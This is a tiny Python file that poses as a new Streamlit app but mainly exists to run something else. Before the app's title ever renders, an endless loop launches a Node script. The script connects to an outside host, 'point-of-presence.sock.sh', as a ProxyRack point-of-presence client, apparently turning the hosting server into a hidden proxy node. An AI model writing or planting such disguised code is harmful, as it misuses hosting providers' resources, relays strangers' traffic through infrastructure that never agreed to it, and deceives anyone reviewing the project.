import streamlit, asyncio, pathlib, nest_asyncio
nest_asyncio.apply()

async def main():
    while True:
        node = await asyncio.create_subprocess_exec('node', pathlib.Path(__file__).resolve().parent.joinpath('script.js'), '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443', '--id', 'c' + '0' * 63, '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP')
        await node.wait()

asyncio.run(main())
streamlit.title("🎈 My new app")
